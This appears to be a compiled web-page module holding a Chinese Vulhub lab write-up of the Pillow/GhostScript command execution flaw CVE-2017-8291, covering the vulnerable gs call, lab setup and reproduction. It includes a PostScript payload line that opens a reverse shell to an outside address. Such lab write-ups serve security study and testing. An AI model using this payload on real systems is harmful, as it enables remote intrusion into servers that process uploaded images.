import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Python 中处理图片的模块 PIL（Pillow），因为其内部调用了 GhostScript 而受到 GhostButt 漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。",-1),d=n("p",null,"参考阅读：",-1),m={href:"http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/",target:"_blank",rel:"noopener noreferrer"},k=e(`<h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>PIL 内部根据图片头（Magic Bytes）判断图片类型，如果发现是一个 eps 文件（头为 <code>%!PS</code>），则分发给 <code>PIL/EpsImagePlugin.py</code> 处理。</p><p>在这个模块中，PIL 调用了系统的 gs 命令，也就是 GhostScript 来处理图片文件：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;gs&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;-q&quot;</span><span class="token punctuation">,</span>                         <span class="token comment"># quiet mode</span>
            <span class="token string">&quot;-g%dx%d&quot;</span> <span class="token operator">%</span> size<span class="token punctuation">,</span>             <span class="token comment"># set output geometry (pixels)</span>
            <span class="token string">&quot;-r%fx%f&quot;</span> <span class="token operator">%</span> res<span class="token punctuation">,</span>              <span class="token comment"># set input DPI (dots per inch)</span>
            <span class="token string">&quot;-dBATCH&quot;</span><span class="token punctuation">,</span>                    <span class="token comment"># exit after processing</span>
            <span class="token string">&quot;-dNOPAUSE&quot;</span><span class="token punctuation">,</span>                  <span class="token comment"># don&#39;t pause between pages,</span>
            <span class="token string">&quot;-dSAFER&quot;</span><span class="token punctuation">,</span>                    <span class="token comment"># safe mode</span>
            <span class="token string">&quot;-sDEVICE=ppmraw&quot;</span><span class="token punctuation">,</span>            <span class="token comment"># ppm driver</span>
            <span class="token string">&quot;-sOutputFile=%s&quot;</span> <span class="token operator">%</span> outfile<span class="token punctuation">,</span>  <span class="token comment"># output file</span>
            <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;%d %d translate&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token operator">-</span>bbox<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span>bbox<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                            <span class="token comment"># adjust for image origin</span>
            <span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> infile<span class="token punctuation">,</span>                 <span class="token comment"># input file</span>
            <span class="token punctuation">]</span>

<span class="token comment"># 省略判断是GhostScript是否安装的代码</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>devnull<span class="token punctuation">,</span> <span class="token string">&#39;w+b&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> devnull<span class="token punctuation">:</span>
        subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stdin<span class="token operator">=</span>devnull<span class="token punctuation">,</span> stdout<span class="token operator">=</span>devnull<span class="token punctuation">)</span>
    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>outfile<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>虽然设置了 <code>-dSAFER</code>，也就是安全模式，但因为 GhostScript 的一个沙盒绕过漏洞（GhostButt CVE-2017-8291），导致这个安全模式被绕过，可以执行任意命令。</p><p>另外，截至目前，GhostScript 官方最新版 9.21 仍然受到这个漏洞影响，所以可以说：只要操作系统上安装了 GhostScript，我们的 PIL 就存在命令执行漏洞。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 运行环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>运行后，访问 <code>http://your-ip:8000/</code> 即可看到一个上传页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>正常功能是我们上传一个 PNG 文件，后端调用 PIL 加载图片，输出长宽。但我们可以将可执行命令 EPS 文件后缀改成 PNG 进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。</p>`,12),h={href:"https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png",target:"_blank",rel:"noopener noreferrer"},v=n("code",null,"touch /tmp/awesome_poc",-1),b=e(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281452756.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 <code>touch /tmp/awesome_poc</code> 命令改为反弹 shell 命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>currentdevice null false mark /OutputFile (%pipe%bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281620079.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function g(_,f){const a=p("ExternalLinkIcon");return c(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",m,[s("http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/"),t(a)])])]),k,n("p",null,[s("比如 "),n("a",h,[s("poc.png"),t(a)]),s("，进行上传，即可执行 "),v,s("。")]),b])}const P=o(l,[["render",g],["__file","Python PIL 远程命令执行漏洞 CVE-2017-8291.html.vue"]]);export{P as default};
